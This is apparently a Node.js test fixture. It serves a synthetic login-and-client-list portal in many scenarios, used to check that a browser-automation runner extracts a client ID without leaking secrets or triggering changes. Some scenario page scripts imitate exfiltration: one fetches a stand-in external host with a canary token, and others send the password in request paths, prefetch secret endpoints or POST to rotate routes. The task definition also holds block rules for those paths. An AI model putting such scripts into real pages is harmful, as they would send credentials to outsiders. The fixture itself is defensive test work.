// Synthetic loopback portal for task tests. Labelled record layout, two origins on one server
// (login path vs list path), independent request counters. Every value is invented.
const http = require("node:http")

const USERNAME = "fixture@example.invalid"
const PASSWORD = "TASK_TEST_PASSWORD_CANARY_5c1d"
const uuid = suffix => `0a0b0c0d-0000-4000-8000-${String(suffix).padStart(12, "0")}`

const similar = { pgid: "19876", integration: "Rondah", status: "Active", clientId: uuid(19876), id: "sim" }
const target = { pgid: "9876", integration: "Rondah", status: "Active", clientId: uuid(9876), id: "target" }
const other = { pgid: "77", integration: "Other", status: "Active", clientId: uuid(77), id: "other" }

const SECRET = "secret0123456789abcdef0123456789"
const SCENARIOS = {
  action_success: { pages: [[target]], action: true },
  action_distinct_ids: { pages: [[{ ...target, id: target.clientId }]], action: true, actionIntegration: "integration-42", actionPath: "integration-42/clients/9876" },
  action_wrong_pgid: { pages: [[target]], action: true, actionPgid: "999" },
  action_invalid_integration: { pages: [[target]], action: true, actionIntegration: "other/path" },
  action_changed_integration: { pages: [[target]], action: true, changedIntegration: true },
  action_before_block: { pages: [[target]], action: true, beforeBlock: true },
  action_later_block: { pages: [[target]], action: true, laterBlock: true },
  action_twice: { pages: [[target]], action: true, twice: true },
  action_wrong_path: { pages: [[target]], action: true, actionPath: "other/clients/9876" },
  action_wrong_query: { pages: [[target]], action: true, actionPath: "target/clients/9876?x=1" },
  action_padded: { pages: [[target]], action: true, padded: true },
  action_placeholder: { pages: [[target]], action: true, placeholder: true },
  action_missing_dialog: { pages: [[target]], action: true, missingDialog: true },
  screenshots_flow: { pages: [[target]], hidden: { ...target, id: "hidden" }, screenshotFields: true },
  responsive_records: { pages: [[similar, target, other]], responsive: true },
  contents_record: { pages: [[{ ...target, contents: true }]] },
  details_success: { pages: [[{ ...target, clientId: null, hiddenLink: true }]] },
  details_output: { pages: [[similar], [{ ...target, clientId: null }]], detailClientId: target.clientId },
  details_missing_output: { pages: [[target]], detailClientId: null },
  details_duplicate_output: { pages: [[target]], detailClientId: target.clientId, duplicateDetailId: true },
  details_invalid_output: { pages: [[target]], detailClientId: "invalid" },
  details_wrong_pgid: { pages: [[target]], detailPgid: "19876" },
  details_missing_marker: { pages: [[target]], missingDetailMarker: true },
  details_ambiguous_link: { pages: [[{ ...target, duplicateLink: true }]] },
  details_query_link: { pages: [[{ ...target, id: "target?unreviewed=yes" }]] },
  details_external_link: { pages: [[{ ...target, href: "https://unreviewed.example/integration-clients/target" }]] },
  details_other_redirect: { pages: [[target]], detailRedirect: "integration-clients/other" },
  details_sensitive_redirect: { pages: [[target]], detailRedirect: "api/secret/target" },
  details_list_redirect: { pages: [[target]], detailRedirect: "integration-clients" },
  details_requests: { pages: [[target]], detailClientId: target.clientId, detailScript: s => `fetch('/${s}/integration-clients/other').catch(()=>{});fetch('/${s}/api/secret/target').catch(()=>{});fetch('/${s}/rotate/target',{method:'POST'}).catch(()=>{})` },
  total_items: { pages: [[similar, target]], totalItems: true },
  total_mismatch: { pages: [[target]], totalItems: true, advertised: 2 },
  total_incomplete: { pages: [[target], [other]], totalItems: true },
  total_invalid: { pages: [[target]], totalItems: true, advertised: "1 items extra" },
  stylesheet_diagnostics: { pages: [[target]], styles: true },
  diagnostics: { pages: [[target]], script: s => `fetch('https://external-secret.example/anything?token=SECRET_CANARY').catch(()=>{});for(let i=0;i<15;i++)fetch('/${s}/rotate/${PASSWORD}/${target.clientId}/12345/fixture%40example.invalid?token=SECRET_CANARY').catch(()=>{})` },
  delayed_auth: { pages: [[target]], delayed: true },
  missing_form: { pages: [[target]], missingForm: true },
  ambiguous_form: { pages: [[target]], ambiguousForm: true },
  happy: { pages: [[similar, target, other]] },
  later_page: { pages: [[similar, other], [target]] },
  duplicate_later_page: { pages: [[similar, target], [{ ...target, clientId: uuid(9999), id: "dup" }]] },
  absent: { pages: [[similar, other]] },
  inactive: { pages: [[{ ...target, status: "Inactive" }]] },
  wrong_integration: { pages: [[{ ...target, integration: "Other" }]] },
  broken_output: { pages: [[{ ...target, clientId: null }]] },
  invalid_id: { pages: [[{ ...target, clientId: "not-a-uuid" }]] },
  hidden_duplicate: { pages: [[similar, target]], hidden: { ...target, clientId: uuid(5555), id: "hidden" } },
  missing_count: { pages: [[target]] },
  malformed_count: { pages: [[target]] },
  count_mismatch: { pages: [[similar, target]], advertised: 9 },
  forbidden_redirect: { pages: [[target]] },
  navigation_failure: { pages: [[target]], broken: true },
  detail_prefetch: { pages: [[similar, target]], script: s => `fetch('/${s}/integration-clients/target').catch(()=>{});fetch('/${s}/api/secret/target').catch(()=>{})` },
  mutation_on_load: { pages: [[similar, target]], script: s => `fetch('/${s}/rotate/target',{method:'POST'}).catch(()=>{})` },
  popup: { pages: [[similar, target]], script: s => `window.open('/${s}/integration-clients/target','_blank')` },
  login_fail: { pages: [[target]], rejectLogin: true },
  mfa: { pages: [[target]], mfa: true },
  // The login page submits itself after a delay, standing in for a human typing in Rondar's browser.
  manual_autologin: { pages: [[similar, target]], autoLogin: true },
}

const shell = body => `<!doctype html><html><head><meta charset="utf-8"><title>Synthetic</title><style>input,textarea,select,[contenteditable=true]{background:#f00}</style></head><body>${body}</body></html>`
const field = (label, value) => (value === null ? "" : `<div class="field col-sm-4 private-SYNTHETIC_SECRET"${["Auth Client ID", "Client ID", "Client Secret", "Subscription Key"].includes(label) ? ' style="background:#f00"' : ""}><span class="label">${label}</span><span class="value">${value}</span></div>`)
const recordHtml = (s, r, hidden = false) =>
  `<div class="client-record"${hidden ? " hidden" : ""}${r.contents ? ' style="display:contents"' : ""}>${r.contents ? '<div style="width:0;height:0;overflow:visible">' : ""}${field("Integration Name", r.integration)}${field("Status", r.status)}${field("Auth Client ID", r.clientId)}${field("PGID", r.pgid)}<a href="${r.href || `/${s}/integration-clients/${r.id}`}">View Details</a>${r.duplicateLink || r.hiddenLink ? `<a ${r.hiddenLink ? "hidden" : ""} href="/${s}/integration-clients/other">View Details</a>` : ""}${r.contents ? "</div>" : ""}</div>`

function listHtml(name, page) {
  const scenario = SCENARIOS[name]
  const records = scenario.pages[page - 1] || []
  const total = scenario.advertised ?? scenario.pages.reduce((sum, p) => sum + p.length, 0)
  const next = page < scenario.pages.length ? `<a id="next" href="/${name}/integration-clients?page=${page + 1}">Next</a>` : `<span aria-disabled="true">Next</span>`
  const hidden = scenario.hidden ? recordHtml(name, scenario.hidden, true) : ""
  const script = scenario.script ? `<script>${scenario.script(name)}</script>` : ""
  const styles = scenario.styles ? ["site.css", "vendor.bundle.min.css", "asset123.css", `${target.clientId}.css`, "synthetic-secret.css", ".private.css"]
    .map(name => `<link rel="stylesheet" href="/${name}?token=${PASSWORD}#SECRET_CANARY">`).join("") +
    '<link rel="stylesheet" href="https://external-secret.example/site.css">' : ""
  const header = scenario.styles ? '<div class="row"><div>Integration Name</div><div>Status</div><div>PGID</div></div>' : ""
  const responsive = scenario.responsive ? '<style>.client-record{display:none}@media(max-width:767px){.client-record{display:block}}</style>' : ""
  const reflectedLogin = scenario.screenshotFields ? `<nav style="background:#f00">Hello, ${USERNAME}</nav>` : ""
  const body = `${styles}${responsive}${reflectedLogin}<h1>Client List</h1>${header}<p>Showing <span id="${name === "missing_count" ? "other-total" : "advertised-total"}">${name === "malformed_count" ? "unknown" : scenario.totalItems ? `Total ${total} items` : total}</span> items</p>${records.map(r => recordHtml(name, r)).join("")}${hidden}${name === "diagnostics" ? '<p class="row private-SYNTHETIC_SECRET">Total 1 items</p>' : ""}${script}<nav>${next}</nav>`
  return scenario.delayed ? shell(`<script>setTimeout(()=>{document.body.innerHTML=${JSON.stringify(body)}},800)</script>`) : shell(body)
}

function startFixturePortal(crossOrigin = false) {
  const events = []
  let loginOrigin
  let listOrigin
  const server = http.createServer(async (req, res) => {
    const url = new URL(req.url, "http://127.0.0.1")
    const [name, route, ...rest] = url.pathname.split("/").filter(Boolean)
    const scenario = SCENARIOS[name]
    const send = (body, status = 200, type = "text/html") => {
      res.writeHead(status, { "Content-Type": type })
      res.end(body)
    }
    const redirect = to => {
      res.writeHead(303, { Location: `/${name}/${to}` })
      res.end()
    }
    const record = kind => events.push({ scenario: name, kind, path: url.pathname, method: req.method })
    if (!scenario) return send("<h1>Unknown</h1>", 404)
    if (scenario.broken) return req.socket.destroy()
    if (route === "login" && req.method === "POST") {
      let raw = ""
      for await (const chunk of req) raw += chunk
      const form = new URLSearchParams(raw)
      const accepted = !scenario.rejectLogin && form.get("username") === USERNAME && form.get("password") === PASSWORD
      record(accepted ? "login_ok" : "login_rejected")
      if (!accepted) return send("<h1>Login failed</h1><form method=\"post\"><input name=\"username\"><input name=\"password\" type=\"password\"><button type=\"submit\">Login</button></form>", 401)
      res.setHeader("Set-Cookie", "auth=1; HttpOnly; Path=/")
      if (crossOrigin) return send(shell(`<form method="post" action="${listOrigin}/${name}/callback"><input name="code" value="fixture-code"></form><script>document.querySelector('form').submit()</script>`))
      return redirect(scenario.mfa ? "mfa" : scenario.delayed ? "callback" : "integration-clients")
    }
    if (crossOrigin && route === "callback") {
      let raw = ""
      for await (const chunk of req) raw += chunk
      if (req.method !== "POST" || new URLSearchParams(raw).get("code") !== "fixture-code" ||
          !(req.headers.cookie || "").includes("auth=1") || !(req.headers.cookie || "").includes("state=fixture")) {
        record("callback_rejected")
        return send("<h1>Rejected</h1>", 401)
      }
      record("callback_ok")
      return redirect("integration-clients")
    }
    if (route === "authorize" || route === "callback") {
      const next = route === "authorize" ? "login" : "integration-clients"
      return send(shell(`<script>setTimeout(()=>location.href='/${name}/${next}',800)</script>`))
    }
    if (route === "login") {
      const autoLogin = scenario.autoLogin
        ? `<script>setTimeout(()=>{document.querySelector('[name=username]').value=${JSON.stringify(USERNAME)};document.querySelector('[name=password]').value=${JSON.stringify(PASSWORD)};document.querySelector('form').submit()},700)</script>`
        : ""
      const form = `<h1>Login</h1><form method="post"><input name="username"><input name="password" type="password"><button type="submit">Login</button></form>`
      if (scenario.missingForm) return send(shell("<h1>Login unavailable</h1>"))
      if (scenario.ambiguousForm) return send(shell(form + form))
      if (scenario.delayed) return send(shell(`<script>setTimeout(()=>{document.body.innerHTML=${JSON.stringify(form)}},800)</script>`))
      const controls = scenario.screenshotFields ? '<textarea>SYNTHETIC_SECRET</textarea><select><option>SYNTHETIC_SECRET</option></select><div contenteditable="true">SYNTHETIC_SECRET</div>' : ""
      return send(shell(form + controls + autoLogin))
    }
    if (route === "mfa") return send(shell("<h1>Verify your identity</h1><input name=\"code\">"))
    if (!(req.headers.cookie || "").includes("auth=1")) {
      if (crossOrigin) {
        res.writeHead(303, { Location: `${loginOrigin}/${name}/login`, "Set-Cookie": "state=fixture; HttpOnly; Path=/" })
        return res.end()
      }
      return redirect(scenario.delayed ? "authorize" : "login")
    }
    if (route === "integration-clients" && rest.length === 0) {
      if (name === "forbidden_redirect") return redirect("api/secret/target")
      if (scenario.broken) return req.socket.destroy()
      record("list")
      return send(listHtml(name, Number(url.searchParams.get("page") || "1")))
    }
    if (route === "api" && rest[0] === "integrations") {
      record("reset")
      return send(JSON.stringify({ value: scenario.placeholder ? "*************" : scenario.padded ? " " + SECRET + " " : SECRET }), 200, "application/json")
    }
    if (route === "integration-clients") {
      record("detail")
      if (scenario.action) return send(shell(`<h1>Client Details</h1><input id="pgid" type="hidden" value="${scenario.actionPgid || "9876"}"><input id="integration" type="hidden" value="${scenario.actionIntegration || "target"}"><input id="clientId" readonly value="${target.clientId}"><input id="clientSecret" readonly type="password" value="*************"><button id="reset">Reset secret</button><div id="confirmation" hidden><button id="confirm">Reset</button></div><div id="success" hidden><button id="close">Close</button></div><script>
        const endpoint='/${name}/api/integrations/${scenario.actionPath || "target/clients/9876"}';
        document.querySelector('#reset').onclick=()=>{document.querySelector('#confirmation').hidden=false;${scenario.changedIntegration ? "setTimeout(()=>document.querySelector('#integration').value='other',50);" : ""}};
        document.querySelector('#confirm').onclick=async()=>{
          const response=await fetch(endpoint);const data=await response.json();document.querySelector('#clientSecret').value=data.value;
          document.querySelector('#confirmation').hidden=true;
          ${scenario.missingDialog ? "" : "document.querySelector('#success').hidden=false;"}
          ${scenario.twice ? "fetch(endpoint).catch(()=>{});" : ""}
          ${scenario.laterBlock ? "fetch('/" + name + "/rotate').catch(()=>{});" : ""}
        };
        document.querySelector('#close').onclick=()=>document.querySelector('#success').hidden=true;
        ${scenario.beforeBlock ? "fetch('/" + name + "/rotate').catch(()=>{});" : ""}
      </script>`))
      if (scenario.detailRedirect) return redirect(scenario.detailRedirect)
      const script = scenario.detailScript ? `<script>${scenario.detailScript(name)}</script>` : ""
      const credentials = scenario.screenshotFields ? field("Client ID", target.clientId) + field("Client Secret", "SYNTHETIC_SECRET") + field("Subscription Key", "SYNTHETIC_SUBSCRIPTION") + `<p style="background:#f00">Hello, ${USERNAME}</p><p style="background:#f00">Reflected ${PASSWORD}</p>` : ""
      const output = scenario.detailClientId === undefined ? "" : field("Client ID", scenario.detailClientId).repeat(scenario.duplicateDetailId ? 2 : 1)
      return send(shell(`${scenario.missingDetailMarker ? "" : "<h1>Client Details</h1>"}${field("PGID", scenario.detailPgid || "9876")}<input type="password" value="SYNTHETIC_SECRET">${credentials}${output}${script}`))
    }
    if (route === "api" && rest[0] === "secret") {
      record("secret")
      return send("{\"clientSecret\":\"SYNTHETIC_SECRET\"}", 200, "application/json")
    }
    if (route === "rotate" || route === "generate") {
      record("mutation")
      res.writeHead(204)
      return res.end()
    }
    record("other")
    return send("<h1>Missing</h1>", 404)
  })
  return new Promise((resolve, reject) => {
    server.once("error", reject)
    const loginServer = crossOrigin ? http.createServer(server.listeners("request")[0]) : null
    const start = () => server.listen(0, "127.0.0.1", () => {
      const origin = `http://127.0.0.1:${server.address().port}`
      listOrigin = origin
      resolve({
        origin,
        loginOrigin,
        events,
        prohibited: name => events.filter(e => e.scenario === name && ["detail", "secret", "mutation"].includes(e.kind)),
        expected: name => (["happy", "later_page", "hidden_duplicate", "detail_prefetch", "mutation_on_load", "popup", "manual_autologin", "details_output"].includes(name) ? target.clientId : null),
        close: () => Promise.all([server, loginServer].filter(Boolean).map(active => new Promise(done => {
          active.closeAllConnections()
          active.close(() => done())
        }))),
      })
    })
    if (loginServer) {
      loginServer.once("error", reject)
      loginServer.listen(0, "127.0.0.1", () => {
        loginOrigin = `http://127.0.0.1:${loginServer.address().port}`
        start()
      })
    } else start()
  })
}

function taskFor(origin, scenario, mode = "env") {
  const listPath = `/${scenario}/integration-clients`
  return {
    schemaVersion: 1,
    name: `fixture-${scenario}`,
    version: "1.0.0",
    startUrl: `${origin}${listPath}`,
    origins: { login: [origin], list: [origin] },
    auth: {
      mode,
      loginOrigin: origin,
      usernameSelector: 'input[name="username"]',
      passwordSelector: 'input[name="password"]',
      submitSelector: 'button[type="submit"]',
      usernameInput: "PORTAL_USERNAME",
      passwordInput: "PORTAL_PASSWORD",
      maxWaitMs: mode === "manual" ? 3000 : scenario === "delayed_auth" ? 6000 : 1800,
    },
    requestPolicy: {
      login: [
        { origin, methods: ["GET"], pathExact: `/${scenario}/authorize` },
        { origin, methods: ["GET"], pathExact: `/${scenario}/callback` },
        { origin, methods: ["GET", "POST"], pathPrefix: `/${scenario}/login` },
        { origin, methods: ["GET"], pathExact: `/${scenario}/mfa` },
        { origin, methods: ["GET"], pathExact: listPath },
      ],
      list: [{ origin, methods: ["GET"], pathExact: listPath }],
      blocked: [
        { pathRegex: `^${listPath.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}/[^?#]+`, category: "detail" },
        { pathRegex: "secret|subscription|reveal", category: "secret" },
        { pathRegex: "generate|rotate", category: "mutation" },
      ],
    },
    list: {
      pathPrefix: listPath,
      markers: ['h1:has-text("Client List")'],
      recordSelector: ".client-record",
      fields: {
        integrationName: { labelText: "Integration Name" },
        status: { labelText: "Status" },
        pgid: { labelText: "PGID" },
        clientId: { labelText: "Auth Client ID" },
      },
      pagination: { nextSelector: "#next", advertisedTotalSelector: "#advertised-total", maxPages: 5 },
    },
    match: { pgid: { parameter: "PGID" }, status: "Active", integrationName: "Rondah" },
    output: { name: "clientId", field: "clientId", format: "uuid" },
    limits: { actionTimeoutMs: 5000, totalTimeoutMs: 30000, cleanupTimeoutMs: 5000 },
  }
}

module.exports = { startFixturePortal, taskFor, USERNAME, PASSWORD, SCENARIOS, SECRET }
